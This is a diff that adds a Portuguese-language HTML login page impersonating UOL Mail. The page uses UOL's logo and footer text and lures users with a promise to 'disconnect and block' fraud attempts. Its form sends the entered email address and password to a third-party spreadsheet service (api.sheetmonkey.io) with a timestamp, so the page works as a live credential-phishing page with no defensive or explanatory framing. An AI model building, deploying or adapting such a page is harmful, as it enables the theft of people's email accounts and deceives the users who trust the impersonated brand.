@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UOL Mail - Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <img src="https://i.imgur.com/91PrCBV.png" alt="UOL Mail" class="uol-logo">
+            </div>
+            
+            <p class="description">
+                Faça o login com o seu e-mail uol<br/> e <strong>desconecte e bloqueie</strong> qualquer<br/> tentativa de fraude.
+            </p>
+
+            <h2>Entrar</h2>
+
+            <form action="https://api.sheetmonkey.io/form/kdkTqJ66DEJE2sMjdqC9dx" method="post" class="login-form" id="loginForm">
+                <div id="emailStep">
+                    <div class="input-group">
+                        <input type="email" id="emailInput" name="email" placeholder="E-mail" required>
+                    </div>
+                    <button type="button" class="submit-btn" id="continueBtn">Continuar</button>
+                </div>
+
+                <div id="passwordStep" class="hidden">
+                    <div class="email-display">
+                        <span id="displayEmail"></span>
+                        <button type="button" class="edit-btn" id="editEmailBtn">✕</button>
+                    </div>
+                    <p class="password-label">Informe sua senha</p>
+                    <div class="input-group password-group">
+                        <input type="password" id="passwordInput" name="password" placeholder="Senha" required>
+                        <button type="button" class="show-password-btn" id="showPasswordBtn">mostrar</button>
+                    </div>
+                    <input type="hidden" name="Created" value="x-sheetmonkey-current-date-time" />
+                    <button type="submit" class="submit-btn">Entrar</button>
+                    <a href="#" class="forgot-password">Esqueceu a senha?</a>
+                </div>
+            </form>
+
+            <p class="signup-text">
+                Ainda não tem e-mail UOL? <a href="#" class="signup-link">ASSINE JÁ</a>
+            </p>
+        </div>
+
+        <footer>
+            <p class="security-note">Sua senha é secreta.</p>
+            <p class="auth-note">Nenhum funcionário a serviço do UOL está autorizado a solicitá-la</p>
+            <div class="footer-links">
+                <a href="#">Regras de uso</a>
+                <a href="#">Política anti-spam</a>
+                <a href="#">Crimes virtuais: denuncie</a>
+            </div>
+        </footer>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
